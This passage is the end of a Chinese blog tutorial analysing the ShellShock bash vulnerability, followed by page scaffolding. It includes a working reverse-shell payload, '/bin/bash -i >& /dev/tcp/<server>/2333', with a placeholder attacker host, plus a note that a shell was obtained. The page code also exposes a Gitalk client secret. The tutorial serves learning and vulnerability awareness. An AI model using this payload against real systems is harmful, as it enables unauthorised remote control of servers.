+<p>我们还可以通过 ShellShock 反弹 Shell , 以便更深入的利用</p>
+<p><strong>Payload : <code>() { :; };echo;/bin/bash -i &gt;&amp; /dev/tcp/你的服务器地址/2333 0&gt;&amp;1;</code></strong></p>
+<p><a href="http://www.guildhab.top/wp-content/uploads/2019/11/2019-11-05_15-14.png" target="_blank" rel="noopener"><img src="http://www.guildhab.top/wp-content/uploads/2019/11/2019-11-05_15-14.png" alt="img"></a></p>
+<p>成功拿到目标主机的 Shell .</p>
+<p>其实在 <code>Metasploit-Framework</code> 中早已集成了 ShellShock 的 Exploit , 利用比较简单 , 这里就不演示了~</p>
+<hr>
+<h4 id="漏洞利用场景"><a href="#漏洞利用场景" class="headerlink" title="漏洞利用场景"></a>漏洞利用场景</h4><p>既然 <code>ShellShock</code> 的本质是注入漏洞 , 那么漏洞利用的场景就非常好判断了</p>
+<ol>
+<li><strong>程序在某一时刻使用 bash 作为脚本解释器处理环境变量赋值</strong></li>
+<li><strong>环境变量的赋值字符串来源于用户输入 , 且没有通过有效的过滤</strong></li>
+</ol>
+<p>若满足以上两个条件 , 该站点很有可能存在 ShellShock 漏洞~</p>
+<script>
+        document.querySelectorAll('.github-emoji')
+          .forEach(el => {
+            if (!el.dataset.src) { return; }
+            const img = document.createElement('img');
+            img.style = 'display:none !important;';
+            img.src = el.dataset.src;
+            img.addEventListener('error', () => {
+              img.remove();
+              el.style.color = 'inherit';
+              el.style.backgroundImage = 'none';
+              el.style.background = 'none';
+            });
+            img.addEventListener('load', () => {
+              img.remove();
+            });
+            document.body.appendChild(img);
+          });
+      </script>
+            </div>
+            <hr/>
+
+            
+
+            <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
+
+<div id="article-share">
+    
+    <div class="social-share" data-disabled="qzone" data-wechat-qrcode-helper="<p>微信里点“发现”->“扫一扫”二维码便可查看分享。</p>"></div>
+    
+</div>
+
+<script src="/libs/share/js/social-share.min.js"></script>
+
+            
+            
+            
+            <div class="reprint1">
+                <p>
+                    <span class="reprint1-tip">
+                        <i class="fa fa-exclamation-circle"></i>&nbsp;&nbsp;转载请注明:
+                    </span>
+                    <a href="https://liloong3t.com" class="b-link-green">Liloong3t's Blog</a>
+                    <i class="fa fa-angle-right fa-lg fa-fw text-color"></i>
+                    <a href="/2021/03/05/2021-3-5-shellshock-lou-dong-yuan-li/" class="b-link-green">shellshock漏洞原理浅析</a>
+                </p>
+            </div>
+
+        </div>
+    </div>
+
+    
+        <link rel="stylesheet" href="/libs/gitalk/gitalk.css">
+<link rel="stylesheet" href="/css/my-gitalk.css">
+
+<div class="card gitalk-card" data-aos="fade-up">
+    <div id="gitalk-container" class="card-content"></div>
+</div>
+
+<script src="/libs/gitalk/gitalk.min.js"></script>
+<script>
+    let gitalk = new Gitalk({
+        clientID: '1a8a4f8abcc406ec4fbe',
+        clientSecret: '135ec1ebd0158365190ca1e28c38ce36e857236b',
+        repo: 'LiGuHeiYi.github.io',
+        owner: 'LiGuHeiYi',
+        admin: ["LiGuHeiYi"],
+        id: '2021/03/05/2021-3-5-shellshock-lou-dong-yuan-li/',
+        distractionFreeMode: false  // Facebook-like distraction free mode
+    });
+
+    gitalk.render('gitalk-container');
+</script>
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+<article id="prenext-posts" class="prev-next articles">
+    <div class="row article-row">
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge left-badge text-color">
+                <i class="fa fa-chevron-left"></i>&nbsp;上一篇</div>
+            <div class="card">
+                <a href="/2021/03/06/2021-3-6-apache-cgi-mod/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/5.jpg" class="responsive-img" alt="利用Apache mod_cgi进行bypass disabled_function攻击">
+                        
+                        <span class="card-title">利用Apache mod_cgi进行bypass disabled_function攻击</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            利用Apache_cgi_mod进行bypass disabled_function攻击的简单原理解析和使用
+                        
+                    </div>
+                    <div class="publish-info">
+                        <span class="publish-date">
+                            <i class="fa fa-clock-o fa-fw icon-date"></i>2021-03-06
+                        </span>
+                        <span class="publish-author">
+                            
+                            <i class="fa fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/blog/" class="post-category" target="_blank">
+                                    blog
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/漏洞/" target="_blank">
+                        <span class="chip bg-color">漏洞</span>
+                    </a>
+                    
+                    <a href="/tags/PHP/" target="_blank">
+                        <span class="chip bg-color">PHP</span>
+                    </a>
+                    
+                    <a href="/tags/Linux/" target="_blank">
+                        <span class="chip bg-color">Linux</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fa fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2021/03/04/2021-3-4-ld-preload/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/21.jpg" class="responsive-img" alt="LD_PRELOAD">
+                        
+                        <span class="card-title">LD_PRELOAD</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            构造一个带命令执行的`eval.os`文件，让其被`LD_PRELOAD`加载；然后在PHP中调用`mail`函数或`error_log`函数，函数内部会执行系统的`sendmail`命令；这样我们构造的`eval.os`就会加载并覆盖sendmail本应调用的库函数，达到命令执行的效果
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="fa fa-clock-o fa-fw icon-date"></i>2021-03-04
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fa fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/blog/" class="post-category" target="_blank">
+                                    blog
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/PHP/" target="_blank">
+                        <span class="chip bg-color">PHP</span>
+                    </a>
+                    
+                    <a href="/tags/ctf/" target="_blank">
+                        <span class="chip bg-color">ctf</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+    </div>
+</article>
+</div>
+
+
+<script>
+    $('#articleContent').on('copy', function (e) {
+        // IE8 or earlier browser is 'undefined'
+        if (typeof window.getSelection === 'undefined') return;
+
+        var selection = window.getSelection();
+        // if the selection is short let's not annoy our users.
+        if (('' + selection).length < Number.parseInt('500')) {
+            return;
+        }
+
+        // create a div outside of the visible area and fill it with the selected text.
+        var bodyElement = document.getElementsByTagName('body')[0];
+        var newdiv = document.createElement('div');
+        newdiv.style.position = 'absolute';
+        newdiv.style.left = '-99999px';
+        bodyElement.appendChild(newdiv);
+        newdiv.appendChild(selection.getRangeAt(0).cloneContents());
+
+        // we need a <pre> tag workaround.
+        // otherwise the text inside "pre" loses all the line breaks!
+        if (selection.getRangeAt(0).commonAncestorContainer.nodeName === 'PRE') {
+            newdiv.innerHTML = "<pre>" + newdiv.innerHTML + "</pre>";
+        }
+
+        var url = document.location.href;
+        newdiv.innerHTML += '<br />'
+            + '来源: Liloong3t's Blog<br />'
+            + '作者: Liloong3t<br />'
+            + '链接: <a href="' + url + '">' + url + '</a><br />'
+            + '本文章著作权归作者所有，转载请注明出处。';
+
+        selection.selectAllChildren(newdiv);
+        window.setTimeout(function () {bodyElement.removeChild(newdiv);}, 200);
+    });
+</script>
+
+
+    </div>
+    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
+        <div class="toc-widget">
+            <div class="toc-title"><i class="fa fa-list-alt"></i>&nbsp;&nbsp;目录</div>
+            <div id="toc-content"></div>
+        </div>
+    </div>
+</div>
+
+<!-- TOC 悬浮按钮. -->
+
+<div id="floating-toc-btn" class="hide-on-med-and-down">
+    <a class="btn-floating btn-large bg-color">
+        <i class="fa fa-list"></i>
+    </a>
+</div>
+
+
+<script src="/libs/tocbot/tocbot.min.js"></script>
+<script>
+    $(function () {
+        tocbot.init({
+            tocSelector: '#toc-content',
+            contentSelector: '#articleContent',
+            headingsOffset: -($(window).height() * 0.4 - 45),
+            // headingsOffset: -205,
+            headingSelector: 'h1, h2, h3, h4, h5'
+        });
+
+        // modify the toc link href to support Chinese.
+        let i = 0;
+        let tocHeading = 'toc-heading-';
+        $('#toc-content a').each(function () {
+            $(this).attr('href', '#' + tocHeading + (++i));
+        });
+
+        // modify the heading title id to support Chinese.
+        i = 0;
+        $('#articleContent').children('h1, h2, h3, h4, h5').each(function () {
+            $(this).attr('id', tocHeading + (++i));
+        });
+
+        // Set scroll toc fixed.
+        let tocHeight = parseInt($(window).height() * 0.4 - 64);
+        let $tocWidget = $('.toc-widget');
+        $(window).scroll(function () {
+            let scroll = $(window).scrollTop();
+            /* add post toc fixed. */
+            if (scroll > tocHeight) {
+                $tocWidget.addClass('toc-fixed');
+            } else {
+                $tocWidget.removeClass('toc-fixed');
+            }
+        });
+
+        
+        /* 修复文章卡片 div 的宽度. */
+        let fixPostCardWidth = function (srcId, targetId) {
+            let srcDiv = $('#' + srcId);
+            if (srcDiv.length === 0) {
+                return;
+            }
+
+            let w = srcDiv.width();
+            if (w >= 450) {
+                w = w + 21;
+            } else if (w >= 350 && w < 450) {
+                w = w + 18;
+            } else if (w >= 300 && w < 350) {
+                w = w + 16;
+            } else {
+                w = w + 14;
+            }
+            $('#' + targetId).width(w);
+        };
+
+        // 切换TOC目录展开收缩的相关操作.
+        const expandedClass = 'expanded';
+        let $tocAside = $('#toc-aside');
+        let $mainContent = $('#main-content');
+        $('#floating-toc-btn .btn-floating').click(function () {
+            if ($tocAside.hasClass(expandedClass)) {
+                $tocAside.removeClass(expandedClass).slideUp(500);
+                $mainContent.removeClass('l9');
+            } else {
+                $tocAside.addClass(expandedClass).slideDown(500);
+                $mainContent.addClass('l9');
+            }
+            fixPostCardWidth('artDetail', 'prenext-posts');
+        });
+        
+    });
+</script>
+    
+
+</main>
+
+
+        <footer class="page-footer bg-color">
+    <div class="container row center-align">
+        <div class="col s12 m8 l8 copy-right">
+            Copyright&copy; 2021 Liloong3t. 
+
+            <br>
+            <span id="sitetime"></span><span class="my-face">ღゝ◡╹)ノ♡</span>
+            <br>
+
+            
+
+            
+
+            
+                &nbsp; | &nbsp;字数统计:&nbsp;
+                <span class="white-color">89.5k</span> 字
+            
+
+            
+            <br>
+
+        </div>
+
+        <div class="col s12 m4 l4 social-link social-statis">
+    <a href="https://github.com/LiGuHeiYi" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
+        <i class="fa fa-github"></i>
+    </a>
+
+
+ 
+    <a href="https://mail.qq.com/cgi-bin/qm_share?t=qm_mailme&email=857340909@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
+        <i class="fa fa-envelope-open"></i>
+    </a>
+
+
+
+
+    <a href="https://zhihu.com/people/mu-ren-qing-32" class="tooltipped" target="_blank" data-tooltip="访问我的知乎" data-position="top" data-delay="50">
+        <i class="fa fa-inverse">知</i>
+    </a>
+
+
+
+    <a href="http://wpa.qq.com/msgrd?v=3&uin=857340909&site=qq&menu=yes" class="tooltipped" target="_blank" data-tooltip="访问我的QQ空间" data-position="top" data-delay="50">
+        <i class="fa fa-qq"></i>
+    </a>
+
+
+
+
+
+    <a href="/atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS 订阅" data-position="top" data-delay="50">
+        <i class="fa fa-rss"></i>
+    </a>
+</div>
+
+    </div>
+</footer>
+
+<div class="progress-bar"></div>
+
+<script language=javascript>
+    function siteTime() {
+        window.setTimeout("siteTime()", 1000);
+        var seconds = 1000;
+        var minutes = seconds * 60;
+        var hours = minutes * 60;
+        var days = hours * 24;
+        var years = days * 365;
+        var today = new Date();
+        var todayYear = today.getFullYear();
+        var todayMonth = today.getMonth() + 1;
+        var todayDate = today.getDate();
+        var todayHour = today.getHours();
+        var todayMinute = today.getMinutes();
+        var todaySecond = today.getSeconds();
+
+        /* Date.UTC() -- 返回date对象距世界标准时间(UTC)1970年1月1日午夜之间的毫秒数(时间戳)
+        year - 作为date对象的年份，为4位年份值
+        month - 0-11之间的整数，做为date对象的月份
+        day - 1-31之间的整数，做为date对象的天数
+        hours - 0(午夜24点)-23之间的整数，做为date对象的小时数
+        minutes - 0-59之间的整数，做为date对象的分钟数
+        seconds - 0-59之间的整数，做为date对象的秒数
+        microseconds - 0-999之间的整数，做为date对象的毫秒数 */
+
+        // var t1 = Date.UTC(2020, 10, 01, 00, 00, 00); //北京时间2020-10-1 00:00:00
+        // var t2 = Date.UTC(todayYear, todayMonth, todayDate, todayHour, todayMinute, todaySecond);
+        // var diff = t2 - t1;
+        // var diffYears = Math.floor(diff / years);
+        // var diffDays = Math.floor((diff / days) - diffYears * 365);
+        // var diffHours = Math.floor((diff - (diffYears * 365 + diffDays) * days) / hours);
+        // var diffMinutes = Math.floor((diff - (diffYears * 365 + diffDays) * days - diffHours * hours) / minutes);
+        // var diffSeconds = Math.floor((diff - (diffYears * 365 + diffDays) * days - diffHours * hours - diffMinutes *
+        //     minutes) / seconds);
+        // document.getElementById("sitetime").innerHTML = "本站已运行 " + diffYears + " 年 " + diffDays + " 天 " + diffHours +
+        //     " 小时 " + diffMinutes + " 分钟 " + diffSeconds + " 秒" ;
+    } /*因为建站时间还没有一年，就将之注释掉了。需要的可以取消*/
+    siteTime();
+</script>
+
+
+
+
+
+
+        <!-- 搜索遮罩框 -->
+<div id="searchModal" class="modal">
+    <div class="modal-content">
+        <div class="search-header">
+            <span class="title"><i class="fa fa-search"></i>&nbsp;&nbsp;搜索</span>
+            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
+                   class="search-input">
+        </div>
+        <div id="searchResult"></div>
+    </div>
+</div>
+
+<script src="/js/search.js"></script>
+<script type="text/javascript">
+$(function () {
+    searchFunc("/" + "search.xml", 'searchInput', 'searchResult');
+});
+</script>
+        <!-- 回到顶部按钮 -->
+<div id="backTop" class="top-scroll">
+    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
+        <i class="fa fa-angle-up"></i>
+    </a>
+</div>
+
+
+        <script src="https://cdn.bootcss.com/materialize/1.0.0/js/materialize.min.js"></script>
+        <script src="https://cdn.bootcss.com/masonry/4.2.2/masonry.pkgd.min.js"></script>
+        <script src="https://cdn.bootcss.com/aos/3.0.0-beta.6/aos.js"></script>
+        <script src="https://cdn.bootcss.com/scrollprogress/3.0.2/scrollProgress.min.js"></script>
+        <script src="https://cdn.bootcss.com/lightgallery/1.6.12/js/lightgallery-all.min.js"></script>
+        <script src="/js/matery.js"></script>
+
+        <!-- Global site tag (gtag.js) - Google Analytics -->
+
+
+
+        
+
+        
+
+        <!-- 2021.02.01 -->
+        <script type="text/javascript">
+            var OriginTitile = document.title,
+                st;
+            document.addEventListener("visibilitychange", function () {
+                document.hidden ? (document.title = "喔哟，404啦！Σ(っ °Д °;)っ", clearTimeout(st)) : (document.title =
+                    "φ(゜▽゜*)♪咦，又好了！~", st = setTimeout(function () {
+                        document.title = OriginTitile
+                    }, 3e3))
+            })
+        </script>
+
+        <!-- 鼠标点击烟花爆炸效果  add 2019.09.09 -->
+        
+
+        <!-- 背景樱花飘落特效 add 2019.09.10 -->
+        
+
+        <!-- 鼠标点击文字特效  add 2019.09.10-->
+        
+
+        <!-- 背景雪花飘落特效  add 2019.09.10 -->
+        
+
+        <!-- 在线聊天工具   add 2019.09.11 -->
+        
+            <script src="//code.tidio.co/xxxxxxxxxxxxxxxxxxxxxxxxxxx.js"></script>
+            <!--  在线聊天位置自定义   add 2019.09.13  -->
+            <script> 
+                $(document).ready(function () {
+
+                    setInterval(change_Tidio, 50);  
+                    function change_Tidio() { 
+
+                        var tidio=$("#tidio-chat iframe");
+                        if(tidio.css("display")=="block"&& $(window).width()>977 ){
+                            document.getElementById("tidio-chat-iframe").style.bottom= ($("div#backTop.top-scroll").css("display")=="none" &&$(window).width()>977)>0? "-40px" : ($("div.toc-title").length&&$(window).width()>977)>0?"80px":"20px";   
+                            document.getElementById("tidio-chat-iframe").style.right="-15px";   
+                            document.getElementById("tidio-chat-iframe").style.height=parseInt(tidio.css("height"))>=520?"520px":tidio.css("height");
+                            document.getElementById("tidio-chat-iframe").style.zIndex="997";
+                        } 
+                        else if(tidio.css("display")=="block"&&$(window).width()>601 &&$(window).width()<992 ){
+                            document.getElementById("tidio-chat-iframe").style.bottom= ($("div#backTop.top-scroll").css("display")=="none" && 601< $(window).width()<992)>0? "-40px":"20px" ;   
+                            document.getElementById("tidio-chat-iframe").style.right="-15px"; 
+                            document.getElementById("tidio-chat-iframe").style.zIndex="997";
+                        }
+                        else if(tidio.css("display")=="block"&&$(window).width()<601 && parseInt(tidio.css("height"))<230){
+                            document.getElementById("tidio-chat-iframe").style.bottom= ($("div#backTop.top-scroll").css("display")=="none" && $(window).width()<601)>0? "-10px":"45px" ;   
+                            document.getElementById("tidio-chat-iframe").style.zIndex="997";
+                        }
+
+                        if( tidio.css("display")=="block"&&$(window).width()<601 && parseInt(tidio.css("height"))>=230){
+                            document.getElementById("tidio-chat-iframe").style.zIndex="998";
+                        }
+                    } 
+                }); 
+            </script>
+        
+
+        <!-- 背景 canvas-nest  add 2019.09.15-->
+        
+
+        <!-- 背景静止彩带   add 2019.09.15-->
+        
+
+        <!-- 背景动态彩带   add 2019.09.15-->
+        
+
+        <!-- 天气接口控件  add 2021.02.01 -->
+        
+            <script type="text/javascript">
+    WIDGET = {FID: '1tFpFZ5Mtj'}
+  </script>
+  <!-- <script type="text/javascript" src="https://apip.weatherdt.com/float/static/js/r.js?v=1111"></script> -->
+  
+  <script type="text/javascript">
+    //只在桌面版网页启用特效
+    var windowWidth = $(window).width();
+    if (windowWidth > 768) {
+        document.write('<script type="text/javascript" src="https://apip.weatherdt.com/float/static/js/r.js?v=1111"><\/script>');
+    }
+    </script>
+        
+
+    </body>
+</html>
